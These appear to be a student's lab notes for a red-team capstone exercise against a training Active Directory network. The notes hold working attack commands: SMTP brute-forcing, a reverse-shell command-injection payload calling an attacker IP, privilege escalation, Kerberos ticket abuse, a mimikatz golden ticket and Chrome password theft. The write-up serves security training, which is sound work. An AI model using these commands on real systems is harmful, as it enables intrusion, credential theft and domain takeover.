# Red Team Capstone (The Reserve): Project Notes

## Phase 1: Perimeter & Initial Access

### OSINT
- **Finding Users**: Extracted from website staff pages and image filenames (e.g., `firstname.lastname.jpg`).
- **Email Format**: `firstname.lastname@corp.thereserve.loc`.
- **CMS**: Identified OctoberCMS.

### SMTP Brute Force
- **Tool**: `hydra`
- **Execution**:
  ```bash
  hydra -L emails.txt -P passwords.txt 10.200.103.11 smtp -vvv
  ```
- **Result**: Found `laura.wood` and `mohammad.ahmed` credentials.

### VPN Gateway Command Injection
- **Target**: `http://10.200.103.12/upload.php`
- **Injection Point**: "Account" field during .ovpn generation.
- **Payload**: `$(/bin/bash -c "/bin/bash -i >& /dev/tcp/10.50.99.39/9001 0>&1")`
- **Result**: Shell as `www-data`.

### Linux PrivEsc (VPN Gateway)
- **Finding**: `sudo -l` shows `(ALL) NOPASSWD: /bin/cp`.
- **Exploit**: Copy a modified `/etc/passwd` over the original to gain root.
  ```bash
  openssl passwd -1 "rooters"
  # Edit /tmp/passwd to add root entry
  sudo /bin/cp /tmp/passwd /etc/passwd
  su root
  ```

---

## Phase 2: Internal AD Foothold (Tier 2)

### Unquoted Service Path (WRK1)
- **Finding**:
  ```powershell
  wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
  ```
- **Service**: `Backup` at `C:\Backup Service\Full Backup\backup.exe`.
- **Exploit**: Place reverse shell at `C:\Backup Service\Full.exe`.
- **Result**: SYSTEM shell.

---

## Phase 3: Lateral Movement & Tier 1 Compromise

### SpoolSample (Printer Bug)
- **Why**: Force a DC to authenticate to a compromised server to capture its TGT.
- **Execution**:
  ```bash
  .\SpoolSample.exe corpdc.corp.thereserve.loc server1.corp.thereserve.loc
  Rubeus.exe monitor /interval:10 /nowrap
  ```
- **Result**: Captured DC ticket, performed PTT to gain DCSync rights.

### Restricted Admin Mode RDP
- **Action**: Enable on target and login without credentials (passing hash).
  ```powershell
  New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
  mstsc.exe /v:[IP] /restrictedadmin
  ```

---

## Phase 4: Domain & Forest Dominance

### GPO Abuse (GenericWrite on GPO)
- **Action**: Create a Scheduled Task via GPMC to add a user to "Domain Admins".
- **Execution**: `gpmc.msc` -> Add Immediate Task -> `net localgroup "Domain Admins" myuser /add`.
- **Result**: Domain Admin access.

### Forest Trust Exploitation (Golden Ticket + Extra SIDs)
- **Why**: Moving from a child domain (`corp.thereserve.loc`) to the parent forest root (`thereserve.loc`).
- **Requirements**: Child KRBTGT hash, Child SID, Parent Enterprise Admins SID (S-1-5-21-...-519).
- **Execution**:
  ```bash
  mimikatz # kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:[CHILD_SID] /sids:[PARENT_EA_SID] /krbtgt:[KRBTGT_HASH] /ptt
  ```
- **Result**: Enterprise Admin access across the entire forest.

---

## Phase 5: Post-Exploitation & Data Theft

### Chrome Password Extraction (Offline)
1. **Target**: `%LocalAppData%\Google\Chrome\User Data\Default\Login Data`.
2. **Action**: Copy the SQLite DB to Kali.
3. **Execution**:
   ```bash
   sqlite3 'Login Data' "SELECT origin_url, username_value, password_value FROM logins;"
   ```
4. **Note**: Requires decryption with user's DPAPI key if not logged in as the user. (Short route: Reset user pass and log in).
